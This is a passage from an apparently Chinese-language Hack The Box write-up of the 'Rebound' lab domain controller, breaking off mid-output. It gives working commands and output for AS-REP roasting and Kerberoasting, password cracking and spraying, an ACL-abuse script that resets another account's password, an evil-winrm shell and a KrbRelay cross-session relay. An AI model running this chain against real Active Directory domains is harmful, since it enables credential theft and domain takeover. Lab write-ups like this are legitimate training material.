<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ GetNPUsers.py -dc-ip 10.10.11.231 rebound.htb/ -usersfile username.txt</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] User Administrator doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User Guest doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class="line">[-] User DC01$ doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User ppaul doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User llune doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User fflock doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">$krb5asrep$23<span class="variable">$jjones</span>@REBOUND.HTB:4c66ae7b7633af8f28c48084b200dedc<span class="variable">$1bf2afd18bdfaf8b79bf4f257bc305fb42b25c8a4142ab2d10b8a3cd41cedf3b7064e45730f69c1b23ccf535e298b3694330fa395db591d75c3b3683fa2d797b2124ca8b97aad2ae6e52019f5cd7ef3dca64ac0ccb7a7a3a455bbde467c8a3c9cda41ca475ca43fa662e1ac73ef83adddbefda8a4c185092f8887ac87a53535eb3e4febfe1b4b1ecc2621219d2fad79d6cf842eb21929d47dee71f08d9a4f61649e7a052e08cfc878aea4208800bc98c44aac2e8cd6f914e63305f2e6a37922188e627c00a412c40e11c98d5ce6ecfc05b593150cc82e12b31b88153489e6782ca082da0127acd9c31fb</span></span><br><span class="line">[-] User mmalone doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User nnoon doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User ldap_monitor doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User oorend doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User winrm_svc doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User batch_runner doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User tbrady doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User delegator$ doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而然john和hashcat都无法破解出密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ john jjones.hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:09 DONE (2024-09-11 11:41) 0g/s 1477Kp/s 1477Kc/s 1477KC/s  0841079575..*7¡Vamos!</span><br><span class="line">Session completed. </span><br><span class="line">                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ hashcat  -m 18200 jjones.hash /usr/share/wordlists/rockyou.txt</span><br><span class="line">[SNIP]</span><br></pre></td></tr></table></figure>

<h3 id="Kerberoast"><a href="#Kerberoast" class="headerlink" title="Kerberoast"></a>Kerberoast</h3><p>当拿到一个“不要求Kerberos预身份验证”的用户时，可以尝试<a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication">Kerberoast 不带预身份验证</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ GetUserSPNs.py -no-preauth jjones -usersfile username.txt -dc-host 10.10.11.231 rebound.htb/ </span><br><span class="line">[SNIP]</span><br><span class="line">$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$ae249e49df17fddc5c790e16e8c3a3f4$0e96f83125e9e6f96f38a69e5e0e3d116d1d54965b900e211ebe077105cf5cb7c26871c34629fc331b4d5698d41c68b2afdd495b454fa80f3a773642e5e52bd5d2d5b321a3ef5c5b639c7a751f3b1e294310f8067696ff6ea04fe57465eb511f988ad2260865776498ee496a5aad8dca5d021d889d3dc82674b64a98a2f1083632bfa9551db5c539c8f4891e8fc019ab40eed0435549f329ddeb52811afbd2dcc70d5bba15828c0061ef914e6d1734ecb64a8206efd4acffb74c48ef78de374aadd88b35ac971bfa5cc3a28549bc43ed0719746856e8b6c3bf7c1781dd76688212c38d5aae9a020b7066300415f7b1d5bf816b830dacd7c2ab2a7c08a409aef9de39dc1da0d5e4c4a33aa32e0b9647cd2ba04a602676d6b8e8ed219f3658acd31ac4c5900f98c05f4decb648eb9a68aed59b6b079660848d706abea1a2f1d9fabc05a463e9da91e74b0fa0ba0b4f47fb5c1fe3531c35c33dd2dca4af79e974264488362b47f9a93f0c8ef07b31d329dcf13cc2a2eaa95c3b14043a8c76c54ff153acaf114259ae901862de0f325fa697101b768160d4f2aec42a1b8a869121cde74a4f70216201bee6ab097e91d4dfee03bf6554bf98f1956efa5b87acb8f0930274a84c12e4b80c30886f2ea48f31e63ecf65153267e5a29a86f9e8e2f1fe61465fb10986a0b5e1c20b504cbce218445e7311f31a6c5376de54b01a9bc96c3e19112915165910ec1327ac1c095280b6d3dda67fc0cb9336376bf1f575fa25c14c1c76372e1d5e03b8355275ba4aafb9d6eae4c18870ca561eb7a6669eca6bab0bdc632fcca98440e9a56e5371086289c06f22dca73bf5779e0826e546602fb518dde1681b05c57fcab6fdf8c453fac4ccb5c427815a79fc7104fd8b193644cf983cedf1f4f34b92c7e5179b852c983f807b83da3c73b4d327f41e8124bb7c482e0bec7b3a26eed116246176b820b171cab3410fe535cad9f573892408e0d04588d9a01f64f27e115e055875b23ee1dcd85731db11f789c41ef858c63cae65c9badee3b0b90e33b63052c042f0de35e8057ee8bf5f677c968d6b0a8dc16182c36cf2f8693b004be6e9960733936ff711f2140da1cbcbedc2d79ba980cdaf26cfe41f09d0387b8e7d4f49bb4462bab64eec8587bdb7502281e25788894690fb6e696ca21d1a51b56286816c3e39d124b4c8640172a3739b799ab785019034f89f93c243ef9ee13c1b915aef5402ef597c9753dc86a945764cb8bf467bdbe33597fb8202f3d066912e2645b366f8770aa3598dcadb780978de2508439114ae3a746e53dad92514022ad1d7dbe0d0a0645e38a15452d7b505d4c22f86af8cd60536ef55</span><br><span class="line">[SNIP]</span><br></pre></td></tr></table></figure>

<p>分别返回了krbtgt，DC01$,delegator$和ldap_monitor的ST；破解krbtgt和DC01$的ST不太现实，delegator$一看就是一台机器账户，如果机器账户设置了Laps，想去破解也几乎不太现实；但是”ldap_monitor”似乎是通过”jjones”用户注册的一个ldap服务账户</p>
<p>成功破解出<code>ldap_monitor</code>的密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ john ldap_monitor.hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">1GR8t@$<span class="variable">$4u</span>       (?)     </span><br><span class="line">1g 0:00:00:05 DONE (2024-09-11 12:39) 0.1980g/s 2582Kp/s 2582Kc/s 2582KC/s 1Gobucs!..1DENA</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>

<p><code>ldap_monitor:1GR8t@$$4u</code>凭据在SMB其效果，在winrm没有反应(猜测ldap_monitor不在远程管理组中)，而且SMB服务枚举一番，并没有收获</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ crackmapexec smb 10.10.11.231  -u ldap_monitor  -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span>   </span><br><span class="line">SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.231    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$<span class="variable">$4u</span> </span><br><span class="line">                                                                                                                                                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ crackmapexec winrm 10.10.11.231  -u ldap_monitor  -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span>  </span><br><span class="line">SMB         10.10.11.231    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)</span><br><span class="line">HTTP        10.10.11.231    5985   DC01             [*] http://10.10.11.231:5985/wsman</span><br><span class="line">WINRM       10.10.11.231    5985   DC01             [-] rebound.htb\ldap_monitor:1GR8t@$<span class="variable">$4u</span></span><br><span class="line">                                                                                                                                                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ crackmapexec smb 10.10.11.231  -u ldap_monitor  -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span>  --shares</span><br><span class="line">SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.231    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$<span class="variable">$4u</span> </span><br><span class="line">SMB         10.10.11.231    445    DC01             [+] Enumerated shares</span><br><span class="line">SMB         10.10.11.231    445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.231    445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.11.231    445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.231    445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.11.231    445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.231    445    DC01             NETLOGON        READ            Logon server share </span><br><span class="line">SMB         10.10.11.231    445    DC01             Shared          READ            </span><br><span class="line">SMB         10.10.11.231    445    DC01             SYSVOL          READ            Logon server share </span><br></pre></td></tr></table></figure>

<h3 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h3><p>由于”1GR8t@$$4u”是一个服务账户的密码，尝试密码喷洒，密码在”oorend”用户上同样起效，但是仍然无法通过winrm拿到shell,smb也没有收获</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ crackmapexec smb 10.10.11.231  -u username.txt -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span>  --continue-on-success</span><br><span class="line">SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\Administrator:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\Guest:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\krbtgt:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\DC01$:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\ppaul:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\llune:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\fflock:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\jjones:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\mmalone:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\nnoon:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$<span class="variable">$4u</span> </span><br><span class="line">SMB         10.10.11.231    445    DC01             [+] rebound.htb\oorend:1GR8t@$<span class="variable">$4u</span> </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\batch_runner:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\tbrady:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\delegator$:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE </span><br></pre></td></tr></table></figure>

<h3 id="滥用ACL"><a href="#滥用ACL" class="headerlink" title="滥用ACL"></a>滥用ACL</h3><p>通过<code>bloodhound</code>来查看域内信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ntpdate -s rebound.htb </span><br><span class="line">bloodhound-python -u ldap_monitor -p &#x27;1GR8t@$$4u&#x27; -d rebound.htb -dc dc01.rebound.htb --zip -c Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn -ns 10.10.11.231</span><br></pre></td></tr></table></figure>

<p>“oorend”对”servicemgmt”组有“self”权限，这意味着，”oorend”可以将自身添加到”servicemgmt”组中；</p>
<p>“servicemgmt”组对”service users”有着”genericall”权限；这意味着，我可以更改或添加”service users”OU的acl</p>
<p>“winrm_svc”在”service users”OU中，这意味着，我可以使得oorend用户对”service users”有完全控制权限，那么oorend就可以去修改”winrm_svc”用户的密码；</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240911181711.png"></p>
<p>脚本如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash</span></span><br><span class="line"></span><br><span class="line">dcip=10.10.11.231</span><br><span class="line"></span><br><span class="line">sudo ntpdate -s <span class="variable">$dcip</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Getting oorend ticket&quot;</span></span><br><span class="line">impacket-getTGT rebound.htb/oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=oorend.ccache</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Adding oorend to servicemgmt group&quot;</span></span><br><span class="line">bloodyAD -d rebound.htb -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> --host dc01.rebound.htb add groupMember ServiceMGMT oorend</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Writing dacl&quot;</span></span><br><span class="line">bloodyAD -d rebound.htb -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> --host dc01.rebound.htb add genericAll <span class="string">&#x27;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#x27;</span> oorend</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Changing winrm_svc password&quot;</span></span><br><span class="line">bloodyAD -d rebound.htb -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> --host dc01.rebound.htb <span class="built_in">set</span> password winrm_svc <span class="string">&#x27;LeetPassword123!&#x27;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ bash poc.sh                                                                                                                                                                             </span><br><span class="line">Getting oorend ticket</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> oorend.ccache</span><br><span class="line">Adding oorend to servicemgmt group</span><br><span class="line">[+] oorend added to ServiceMGMT</span><br><span class="line">Writing dacl</span><br><span class="line">[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB</span><br><span class="line">Changing winrm_svc password</span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure>

<p>成功修改”winrm_svc”用户的密码之后，我就可以用”LeetPassword123!”密码通过winrm连接，因为”winrm_svc”属于”remote management users”组中，这一点可以在bloodhound中看到；</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240911182612.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ evil-winrm -i 10.10.11.231 -u winrm_svc -p <span class="string">&#x27;LeetPassword123!&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">rebound\winrm_svc</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Cross-session"><a href="#Cross-session" class="headerlink" title="Cross-session"></a>Cross-session</h3><p>虽然拿下winrm_svc，仍然不能利用”CanPSRemote”到域控机器，因为这个利用手法是需要凭据的，可以从<a target="_blank" rel="noopener" href="https://support.bloodhoundenterprise.io/hc/en-us/articles/17322220586779-CanPSRemote">CanPSRemote</a>了解到</p>
<p>正在运行的进程，有一些有趣的事情,session 1 中有一堆进程。通常在 HTB 计算机上，当没有人登录时，我会看到<code>LogonUI</code>和其他几个进程，但这里<code>explorer</code>正在运行，而且看起来有人确实登录了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; get-process</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName</span><br><span class="line">-------  ------    -----      -----     ------     --  -- -----------</span><br><span class="line">    395      33    12696      21332              2828   0 certsrv</span><br><span class="line">    480      19     2244       5492               392   0 csrss</span><br><span class="line">    274      16     2228       5300               504   1 csrss</span><br><span class="line">    357      15     3476      15000              5868   1 ctfmon</span><br><span class="line">    401      33    16376      25236              2928   0 dfsrs</span><br><span class="line">    189      13     2388       8204              1836   0 dfssvc</span><br><span class="line">    290      14     3848      13808              3876   0 dllhost</span><br><span class="line">   5374    4793    69020      71240              2968   0 dns</span><br><span class="line">    601      25    24480      52216                60   1 dwm</span><br><span class="line">   1505      59    25076      89616              5312   1 explorer</span><br><span class="line">     53       6     1788       5444              2804   1 fontdrvhost</span><br><span class="line">     53       6     1504       4728              2812   0 fontdrvhost</span><br><span class="line">      0       0       56          8                 0   0 Idle</span><br><span class="line">    142      14     2224       6096              2984   0 ismserv</span><br><span class="line">   2390     188    55980      74420               656   0 lsass</span><br><span class="line">    492      36    52016      64604              2836   0 Microsoft.ActiveDirectory.WebServices</span><br><span class="line">    254      13     2912      10840              4152   0 msdtc</span><br><span class="line">    646      92   305660     323116              2504   0 MsMpEng</span><br><span class="line">    110       7     1276       6892              1692   1 PickerHost</span><br><span class="line">    158      10     1612       8700              6676   1 PickerHost</span><br><span class="line">      0      14      320      21272                88   0 Registry</span><br><span class="line">    235      12     2704      17160              2588   1 RuntimeBroker</span><br><span class="line">    293      15     5656      17056              6192   1 RuntimeBroker</span><br><span class="line">    231      12     2320      12932              6572   1 RuntimeBroker</span><br><span class="line">    672      32    19596      72168              5660   1 SearchUI</span><br><span class="line">    276      12     2836      12528              2172   0 SecurityHealthService</span><br><span class="line">    628      14     5668      13520               636   0 services</span><br><span class="line">    783      30    16972      60172              2524   1 ShellExperienceHost</span><br><span class="line">    454      17     5080      25200              5544   1 sihost</span><br><span class="line">     53       3      528       1228               288   0 smss</span><br><span class="line">    329      15     5312      13996               332   0 svchost</span><br><span class="line">    209      12     1672       7540               488   0 svchost</span><br><span class="line">    158       9     1864       7000               508   0 svchost</span><br><span class="line">    137      17     3440       7812               768   0 svchost</span><br><span class="line">     89       5      904       4012               848   0 svchost</span><br><span class="line">    215      12     1972      10132               864   0 svchost</span><br><span class="line">    939      21     6980      23168               868   0 svchost</span><br><span class="line">    918      20     5320      13128               916   0 svchost</span><br><span class="line">    257      10     2004       7952               956   0 svchost</span><br></pre></td></tr></table></figure>

<p><strong>Session ID（会话标识符）</strong> 是 Windows 操作系统中为每个用户会话分配的唯一标识符;每个用户在登录时都会分配一个会话 ID，Windows 会区分每个登录用户的会话，并隔离每个用户的进程。<strong>0</strong> 表示的是 <strong>Session 0</strong>，通常表示与系统服务相关的进程，因为系统服务通常在会话 0 中运行，而普通用户的交互式进程则在不同的会话中。</p>
<p><code>qwinsta</code>是<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/qwinsta">显示有关会话主机的信息</a>的命令，但它失败;遇到了<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/272327/cannot-qwinsta-during-winrm-but-it-works-when-run-under-newcredentials-logo">这篇 Security Stack Exchange 帖子</a>，它没有解释原因，但表明<code>RunasCs.exe</code>可以使其工作;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; .\RunasCs.exe oorend &#x27;1GR8t@$$4u&#x27; -l 9 &quot;qwinsta&quot;</span><br><span class="line"></span><br><span class="line"> SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE</span><br><span class="line">&gt;services                                    0  Disc</span><br><span class="line"> console           tbrady                    1  Active</span><br></pre></td></tr></table></figure>

<p>显示 TBrady 用户已登录;</p>
<p>使用runasCs和KrbRelay的组合，可以强制来自tbrady的连接，这将生成hash。为此，通过-ntlm指定NTLM身份验证，通过-session指定session号，并为具有正确权限的有效RPC服务指定CLSID，从README上列出的<a target="_blank" rel="noopener" href="https://github.com/cube0x0/KrbRelay#clsids">默认值</a>中选择</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; .\RunasCs.exe x x -l 9 <span class="string">&quot;C:\Users\winrm_svc\Documents\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm&quot;</span></span><br><span class="line"></span><br><span class="line">[*] Auth Context: rebound\tbrady</span><br><span class="line">[*] Rewriting <span class="keyword">function</span> table</span><br><span class="line">[*] Rewriting 